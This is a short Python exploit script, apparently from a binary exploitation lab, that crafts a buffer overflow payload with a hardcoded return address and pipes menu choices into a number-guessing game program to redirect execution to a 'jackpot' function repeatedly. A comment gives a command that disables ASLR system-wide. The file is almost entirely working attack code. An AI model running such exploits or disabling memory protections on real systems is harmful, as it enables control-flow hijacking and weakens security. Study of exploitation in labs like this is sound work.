#!/usr/bin/env python
#
# Note: May need to disable ASLR to get it to work 
#       outside of GDB
#
# Command:
#   echo 0 > /proc/sys/kernel/randomize_va_space
#

import sys

offset  = 'A' * 100
retADDR = "\xa4\x6a\x55\x56" # <x/x &jackpot>
padding = 'C' * 106

payload = offset + retADDR + padding

injection = (
"6\n"     # Reset your account at credits
"5\n"     # Change user name
"{:s}\n"  # <evil buffer>
"1\n"     # Play the Pick a Number game
"1\n"     # <guess>
"n\n"     # DO NOT PLAY AGAIN
"5\n"     # Reset your account at credits
"{:s}\n"  # <evil buffer>
).format(payload, payload)

injection += "1\ny\n" * 50

sys.stdout.write(injection)
